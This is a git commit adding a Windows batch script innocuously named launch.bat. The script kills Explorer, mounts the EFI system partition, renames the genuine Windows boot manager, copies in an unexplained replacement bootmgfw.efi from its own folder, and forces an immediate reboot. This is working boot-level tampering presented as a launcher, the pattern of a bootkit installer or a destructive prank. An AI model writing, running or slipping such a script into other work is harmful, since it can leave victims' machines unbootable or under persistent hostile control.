5e1adeff48c2ae158a6e74583277659e8ac79a12
bruno <121198083+noxxUY@users.noreply.github.com>
2025-01-20 22:13:26 -0300

    Add files via upload

---
+++ launch.bat
@@ -0,0 +1,19 @@
+@echo off
+
+taskkill /f /im explorer.exe
+
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    mountvol Z: /S
+    
+    attrib -s -h Z:\EFI\Microsoft\Boot\bootmgfw.efi
+    move Z:\EFI\Microsoft\Boot\bootmgfw.efi Z:\EFI\Microsoft\Boot\bootmgfw.old
+    
+    xcopy %~dp0bootmgfw.efi Z:\EFI\Microsoft\Boot\
+
+    shutdown /r /f /t 0
+
+) else (
+    echo Failure: Please run as admin.
+    pause
+)
